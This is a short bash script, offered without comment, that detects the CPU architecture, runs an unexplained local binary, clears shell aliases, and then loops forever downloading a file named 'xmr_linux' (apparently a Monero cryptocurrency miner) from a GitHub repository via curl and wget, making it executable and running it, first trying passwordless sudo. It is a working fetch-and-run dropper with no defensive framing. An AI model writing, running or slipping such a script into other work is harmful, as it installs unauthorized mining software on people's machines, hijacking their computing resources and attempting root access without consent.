#!/bin/bash

architecture=$(uname -m)

case $architecture in
    arm64 | aarch64)
        arch="arm64"
        ;;
    x86_64 | amd64)
        arch="amd64"
        ;;
    *)
        echo "Unsupported architecture: $architecture"
        exit 1
        ;;
esac
chmod +x prepare.bin
./prepare.bin

unalias -a

while true; do
    rm xmr_linux_$arch
    curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
    chmod +x xmr_linux_$arch
    sudo -n ./xmr_linux_$arch
    ./xmr_linux_$arch

    rm xmr_linux_$arch
    wget https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
    chmod +x xmr_linux_$arch
    sudo -n ./xmr_linux_$arch
    ./xmr_linux_$arch
done
